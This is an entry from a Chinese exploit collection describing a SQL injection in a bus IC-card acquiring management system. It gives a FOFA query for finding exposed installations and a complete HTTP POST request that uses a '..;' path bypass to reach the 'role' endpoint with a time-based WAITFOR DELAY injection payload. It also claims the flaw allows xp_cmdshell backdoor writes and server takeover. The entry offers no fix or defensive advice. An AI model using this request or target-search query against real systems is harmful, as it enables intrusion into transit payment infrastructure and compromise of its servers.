---
fofa: "app="
source: "wy876 漏洞文库"
---

# 公交IC卡收单管理系统role存在SQL注入漏洞

# 一、漏洞简介
公交IC卡收单管理系统是城市公共交通领域中不可或缺的一部分，它通过集成先进的集成电路技术（IC卡）实现了乘客便捷的支付方式，并有效提高了公共交通运营效率。系统集成了发卡、充值、消费、数据采集、查询和注销等多个功能模块，为公交公司和乘客提供了全面、高效、便捷的公共交通支付解决方案。该系统不仅提升了乘客的出行体验，还降低了公交公司的运营成本，提高了管理效率。公交IC卡收单管理系统 role存在SQL注入漏洞。经过身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

# 二、影响版本
+ 公交IC卡收单管理系统

# 三、资产测绘
+ fofa`app="公交IC卡收单管理系统"`
+ 特征


# 四、漏洞复现
```java
POST /assets/..;/role HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=BE20D06711487C9D6D5325C1129F244C
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
 
_search=false&nd=1727245571646&rowCountPerPage=10&pageNo=1&sidx=ROLE_NAME&sord=asc&method=select&ROLE_NAME=1');WAITFOR DELAY '0:0:5'--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lntxyx716eea8fw2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
